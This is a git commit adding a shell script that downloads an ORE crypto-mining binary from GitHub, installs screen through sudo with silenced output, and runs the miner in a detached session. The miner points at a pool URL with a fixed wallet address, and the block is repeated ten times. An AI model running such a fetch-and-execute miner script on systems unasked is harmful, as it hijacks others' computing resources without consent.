5fb90b157892a27baa02aeba0d5eec976ee759f7
obisumila <obisumila@gmail.com>
2025-04-16 11:44:01 +0800

    Add files via upload

---
+++ anemilopo.sh
@@ -0,0 +1,100 @@
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/xintai6660707/ore-mine-pool/raw/refs/heads/main/ore-mine-pool-linux-avx512 ;
+chmod +x ore-mine-pool-linux-avx512 ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./ore-mine-pool-linux-avx512 worker  --server-url  "http://mine.oreminepool.top:8080/" --worker-wallet-address 2JerF2uyP2R2TQA7ukY1khRn7td3XCHDxbHzyTti9UsE ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
